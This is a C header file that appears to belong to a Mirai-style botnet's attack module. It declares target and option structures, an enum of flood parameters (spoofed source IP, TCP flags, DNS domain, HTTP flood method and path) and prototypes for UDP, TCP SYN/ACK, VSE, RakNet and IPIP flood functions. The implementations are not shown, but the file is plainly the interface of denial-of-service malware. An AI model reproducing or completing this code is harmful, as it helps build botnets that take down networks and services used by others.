#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define TRUE 1
#define FALSE 0

#define CLOSE_DELAY 100000

struct attack_target {
    uint32_t addr;
    uint8_t netmask;
    struct sockaddr_in sock_addr;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct tcpsocket_t 
{
    int fd;
    uint16_t repeat;
    BOOL connected;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

enum 
{
    ATK_OPT_PAYLOAD_SIZE    = 0,    // What should the size of the packet data be?
    ATK_OPT_PAYLOAD_RAND    = 1,    // Should we randomize the packet data contents?
    ATK_OPT_IP_TOS          = 2,    // tos field in IP header
    ATK_OPT_IP_IDENT        = 3,    // ident field in IP header
    ATK_OPT_IP_TTL          = 4,    // ttl field in IP header
    ATK_OPT_IP_DF           = 5,    // Dont-Fragment bit set
    ATK_OPT_SPORT           = 6,    // Should we force a source port? (0 = random)
    ATK_OPT_DPORT           = 7,    // Should we force a dest port? (0 = random)
    ATK_OPT_DOMAIN          = 8,    // Domain name for DNS attack
    ATK_OPT_DNS_HDR_ID      = 9,    // Domain name header ID
    ATK_OPT_URG             = 11,   // TCP URG header flag
    ATK_OPT_ACK             = 12,   // TCP ACK header flag
    ATK_OPT_PSH             = 13,   // TCP PSH header flag
    ATK_OPT_RST             = 14,   // TCP RST header flag
    ATK_OPT_SYN             = 15,   // TCP SYN header flag
    ATK_OPT_FIN             = 16,   // TCP FIN header flag
    ATK_OPT_SEQRND          = 17,   // Should we force the sequence number? (TCP only)
    ATK_OPT_ACKRND          = 18,   // Should we force the ack number? (TCP only)
    ATK_OPT_GRE_CONSTIP     = 19,   // Should the encapsulated destination address be the same as the target?
    ATK_OPT_METHOD			= 20,   // Method for HTTP flood
    ATK_OPT_POST_DATA		= 21,	// Any data to be posted with HTTP flood
    ATK_OPT_PATH            = 22,   // The path for the HTTP flood
    ATK_OPT_HTTPS           = 23,   // Is this URL SSL/HTTPS?
    ATK_OPT_CONNS           = 24,   // Number of sockets to use
    ATK_OPT_SOURCE          = 25,   // Source IP

    ATK_OPT_MINLEN          = 26,   // Min len
    ATK_OPT_MAXLEN          = 27,   // Max len
    ATK_OPT_PAYLOAD         = 28    // Custom Payload
};

struct attack_method 
{
    ATTACK_VECTOR vector;
    ATTACK_FUNC func;
};

struct attack_stomp_data 
{
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

/* Actual attacks */
void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_pps(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_raknet(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_ipip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
